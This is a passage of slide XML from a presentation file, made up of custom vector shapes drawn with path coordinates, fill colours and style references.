                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427" name="CustomShape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2835360" y="4356000"/>
            <a:ext cx="13680" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="36">
                <a:moveTo>
                  <a:pt x="9" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428" name="CustomShape 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2639880" y="4341960"/>
            <a:ext cx="5760" cy="186480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="429" name="CustomShape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2706840" y="4336920"/>
            <a:ext cx="72360" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="46" h="55">
                <a:moveTo>
                  <a:pt x="4" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="999999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="CustomShape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="4402080"/>
            <a:ext cx="57960" cy="13680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="9">
                <a:moveTo>
                  <a:pt x="0" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431" name="CustomShape 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="4363920"/>
            <a:ext cx="57960" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="10">
                <a:moveTo>
                  <a:pt x="0" y="5"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="CustomShape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2660760" y="4344840"/>
            <a:ext cx="96120" cy="177120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="61" h="112">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="109"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="112"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="95"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="CustomShape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2708280" y="4303800"/>
            <a:ext cx="124560" cy="23040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="15">
                <a:moveTo>
                  <a:pt x="0" y="15"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="CustomShape 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2637000" y="4525920"/>
            <a:ext cx="208800" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="45">
                <a:moveTo>
                  <a:pt x="55" y="44"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="56" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="44"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435" name="CustomShape 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2592360" y="4545000"/>
            <a:ext cx="213480" cy="62640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="135" h="40">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="132" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436" name="CustomShape 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2629080" y="4537080"/>
            <a:ext cx="208800" cy="54720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="35">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437" name="CustomShape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="4540320"/>
            <a:ext cx="210240" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="133" h="38">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438" name="CustomShape 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3382920" y="4037040"/>
            <a:ext cx="516960" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="326" h="65">
                <a:moveTo>
                  <a:pt x="162" y="0"/>
                </a:moveTo>
                <a:lnTo>
